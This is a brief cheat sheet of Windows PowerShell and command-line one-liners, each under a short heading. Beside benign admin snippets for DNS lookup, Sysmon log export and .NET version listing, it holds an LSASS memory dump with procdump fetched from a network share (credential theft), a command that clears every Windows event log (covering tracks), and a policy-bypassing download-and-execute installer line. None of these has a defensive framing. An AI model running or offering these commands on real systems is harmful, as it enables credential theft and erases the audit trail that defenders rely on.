Resolve IP to HOST
```
[System.Net.Dns]::GetHostbyAddress(“$IP”)
```


Live sys internals
```
net use s: \\live.sysinternals.com\tools;
s:\procdump64.exe -accepteula -ma lsass.exe c:\windows\temp\lsass.dmp 2>&1'
```

Choco install
```
Set-ExecutionPolicy Bypass -Scope Process -Force; 
iex ((New-ObjectSystem.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))
```

Clear all logs
```
wevtutil el | Foreach-Object {wevtutil cl “$_”};
ping localhost;
```

Export sysmon log
```
WEVTUtil query-events "Microsoft-Windows-Sysmon/Operational" /format:xml /e:sysmonview > $env:HOMEPATH\Downloads\eventlog.xml
```

Return .NET versions
```
Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -recurse |
Get-ItemProperty -name Version,Release -EA 0 |
Where { $_.PSChildName -match '^(?!S)\p{L}'} |
Select PSChildName, Version, Release
```
